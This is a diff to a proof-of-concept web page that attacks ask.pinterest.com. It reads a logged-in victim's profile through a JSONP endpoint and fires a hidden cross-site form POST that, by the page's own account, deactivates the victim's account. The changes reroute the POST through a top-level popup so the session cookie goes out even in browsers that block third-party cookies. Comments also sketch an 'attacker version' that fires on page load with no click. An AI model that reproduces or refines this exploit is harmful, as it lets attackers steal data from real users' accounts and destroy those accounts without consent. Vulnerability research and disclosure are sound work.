@@ -131,8 +131,10 @@
 </footer>
 </div>
 
-<iframe name="pwnd" style="display:none"></iframe>
-<form id="csrf" method="POST" action="https://ask.pinterest.com/api/proxy/pinterest/users/me/" target="pwnd" style="display:none">
+<!-- No hidden iframe: the POST must land in a TOP-LEVEL window (created by window.open or
+     automatically by the form's unknown target) so it is first-party to ask.pinterest.com
+     and carries the session cookie on every browser, including third-party-cookie blockers. -->
+<form id="csrf" method="POST" action="https://ask.pinterest.com/api/proxy/pinterest/users/me/" target="pwnd_top" style="display:none">
   <input type="hidden" name="first_name" value="Stag">
 </form>
 
@@ -141,6 +143,7 @@ document.getElementById('pgorigin').textContent = location.origin || 'null';
 
 var B = 'https://ask.pinterest.com/api/proxy/pinterest/';
 var FIRED = false;
+var READ_OK = false;   // whether the JSONP read channel ever returned a session (step 1)
 
 function esc(s){var d=document.createElement('div');d.textContent=s==null?'':String(s);return d.innerHTML;}
 function setState(id, txt, cls){var e=document.getElementById(id);e.textContent=txt;e.className='state '+(cls||'wait');}
@@ -157,8 +160,15 @@ function loot(id, pairs){
 }
 
 // ---------- step 1: read side ----------
+// NOTE: this read is a third-party subresource. Browsers that block third-party
+// cookies (Safari/ITP, Firefox strict, Chrome 3p phaseout / incognito) never attach
+// the Pinterest session cookie to it, and the proxy then returns plain 401 JSON with
+// nosniff, which fails script execution -> onerror. That is indistinguishable from
+// "not logged in" from inside the page, so we also probe network reachability to
+// separate "cannot reach ask.pinterest.com" from "session cookie not attached".
 window.cbMe = function(d){
   var u = (d && d.data) || {};
+  READ_OK = true;
   setState('st1', '200 OK, victim confirmed logged in', 'ok');
   show('out1', d);
   loot('loot1', [
@@ -167,14 +177,26 @@ window.cbMe = function(d){
     ['full name', u.full_name || (u.fullName || '(none)')]
   ]);
 };
+window.readFail = function(reason){
+  fetch('https://ask.pinterest.com/api/health', {mode:'no-cors'})
+    .then(function(){ setState('st1', 'read channel failed (' + reason + '). Network is reachable, so either you are not logged in to Pinterest in this browser, or this browser blocks third-party cookies (Safari/ITP, Firefox strict, Chrome 3p-block/incognito) so this foreign page cannot see your session. The write in step 2 does not depend on this read.', 'err'); })
+    .catch(function(){ setState('st1', 'read channel failed (' + reason + ') AND ask.pinterest.com is not reachable from this device (DNS/proxy/firewall block).', 'err'); });
+};
 (function(){
   var s = document.createElement('script');
   s.src = B + 'users/me/?callback=cbMe&_=' + Date.now();
-  s.onerror = function(){ setState('st1', 'request failed (are you logged in to Pinterest in this browser?)', 'err'); };
+  s.onerror = function(){ window.readFail('no JSONP response'); };
+  s.onload = function(){ setTimeout(function(){ if (!document.getElementById('st1').classList.contains('ok')) window.readFail('no callback fired'); }, 1200); };
   document.body.appendChild(s);
 })();
 
 // ---------- step 2: write side ----------
+// The POST goes to a TOP-LEVEL popup window (window.open + form target), not a hidden
+// iframe. A top-level navigation to ask.pinterest.com is a first-party request in that
+// window, so the SameSite=None session cookie is attached on EVERY browser, including
+// those that block third-party cookies in embedded contexts. The hidden-iframe variant
+// (kept as a fallback when popups are blocked) only works where third-party cookies are
+// allowed, which is exactly why the exploit silently failed on some devices.
 document.getElementById('arm').addEventListener('click', function(){
   if (FIRED) return;
   FIRED = true;
@@ -183,6 +205,10 @@ document.getElementById('arm').addEventListener('click', function(){
   document.getElementById('armstate').textContent = 'fired';
   document.getElementById('armstate').className = 'state err';
   setState('st2', 'fired, cross-site POST sent with your cookies', 'err');
+  var w = window.open('', 'pwnd_top');   // top-level auxiliary window: cookies always sent
+  if (w) {
+    w.document.write('<body style="background:#0d1117;color:#8b949e;font:13px monospace;padding:16px">POST fired from ' + esc(location.origin) + ' - deactivating...</body>');
+  }
   document.getElementById('csrf').submit();
   // attacker version, no interlock:
   // document.getElementById('csrf').submit();   // on page load
@@ -227,6 +253,17 @@ function checkDead(){
   s.src = B + 'users/me/?callback=cbDead&_=' + Date.now();
   s.onerror = function(){
     checked = true;
+    if (!READ_OK) {
+      // read channel never worked on this device (third-party cookies blocked):
+      // this page cannot distinguish dead session from blocked cookies. The write in
+      // step 2 fired top-level and is unaffected by the cookie block.
+      setState('st3', 'cannot verify from this page (read channel blocked on this browser)', 'wait');
+      document.getElementById('out3').textContent = 'This browser blocks third-party cookies, so the JSONP read never worked here (see step 1). The cross-site POST in step 2 was sent as a top-level navigation and did carry your session cookie. To verify the deactivation, open pinterest.com in this browser: if you are logged out / the account is gone, the write took effect.';
+      var v = document.getElementById('verdict');
+      v.className = 'status wait';
+      v.textContent = 'Write fired (top-level). Read verification unavailable on this browser - check pinterest.com directly.';
+      return;
+    }
     setState('st3', 'read failed, session rejected', 'err');
     document.getElementById('out3').textContent = 'The proxy returned an authentication error body with no callback wrapper. The session cookie is no longer accepted, exactly what deactivation does.';
     dead();
